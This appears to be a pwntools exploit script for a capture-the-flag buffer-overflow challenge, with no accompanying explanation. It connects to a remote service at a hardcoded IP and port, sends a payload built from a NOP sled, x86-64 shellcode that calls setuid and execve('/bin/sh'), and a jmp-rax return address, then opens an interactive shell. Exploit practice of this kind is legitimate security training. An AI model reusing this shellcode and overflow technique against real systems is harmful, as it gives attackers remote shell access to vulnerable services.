from pwn import *

# p = process("./bof")

IP = "35.234.100.160"
port = 30383

p = remote(IP, port)

# gdb.attach(p, gdbscript = '''b vuln''')

shellcode = "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
address = 0x00000000004006e1
jmp_rax = "\xe1\x06\x40\x00\x00\x00\x00\x00"
payload = "\x90" * 64 + shellcode + "\x90" * 200 + jmp_rax

print(payload)

p.recvuntil("Please enter the flag:")
p.sendline(payload)
log.info(payload)
p.interactive()
